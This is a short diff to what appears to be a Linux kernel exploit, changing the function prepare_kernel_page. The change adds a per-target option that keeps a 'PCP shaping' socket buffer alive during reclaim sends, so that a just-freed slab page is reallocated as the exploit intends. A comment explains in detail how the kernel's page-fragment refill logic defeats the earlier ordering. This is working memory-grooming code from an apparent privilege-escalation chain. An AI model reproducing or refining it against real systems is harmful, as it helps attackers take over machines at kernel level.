@@ -662,8 +662,19 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     spray_ctx.memfds[i] = -1;
   }
 
-  SYSCHK(close(pcp_shaping_sv[0]));
-  SYSCHK(close(pcp_shaping_sv[1]));
+  // The shaping skb pins the current task_frag page. Dropping it here leaves
+  // pfrag->page at refcount 1, and skb_page_frag_refill() answers that by
+  // rewinding pfrag->offset to 0 and handing the *same* page back instead of
+  // allocating a fresh one — so the first reclaim send, the one that would
+  // otherwise pop the just-freed slab page off the PCP LIFO head, never asks
+  // the page allocator for anything. Targets that set
+  // RECLAIM_KEEP_PCP_SHAPING keep the shaping skb queued until every reclaim
+  // send is done, which holds the page at refcount 2 and forces each send to
+  // allocate.
+  if (!RECLAIM_KEEP_PCP_SHAPING) {
+    SYSCHK(close(pcp_shaping_sv[0]));
+    SYSCHK(close(pcp_shaping_sv[1]));
+  }
   sched_yield();
   sched_yield();
   sched_yield();
@@ -676,6 +687,10 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     if (sent <= 0) {
       break;
     }
+  }
+  if (RECLAIM_KEEP_PCP_SHAPING) {
+    SYSCHK(close(pcp_shaping_sv[0]));
+    SYSCHK(close(pcp_shaping_sv[1]));
   }
   kernelsnitch_cleanup(ks);
   ks = NULL;
